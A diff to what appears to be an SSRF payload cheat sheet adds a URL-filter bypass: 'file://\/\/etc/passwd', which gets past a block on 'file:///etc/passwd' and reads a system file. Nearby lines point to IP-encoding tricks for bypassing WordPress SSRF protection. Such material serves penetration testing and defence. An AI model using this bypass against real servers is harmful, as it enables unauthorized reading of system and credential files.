@@ -116,6 +116,13 @@ ip can be decimal, hexidecimal, or Octal
 ```  
 This tricks can be used to bypass wordpress protection on SSRF in CVE-2016-4029  
 
+* Bypass url limit:  
+```php
+// @Adrien
+file:///etc/passwd   // Not authorized
+file://\/\/etc/passwd    // Work
+```  
+
 ## Reference
 * [New-Era-Of-SSRF-Exploiting-URL](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)  
 * [SSRF testing resources](https://github.com/cujanovic/SSRF-Testing)
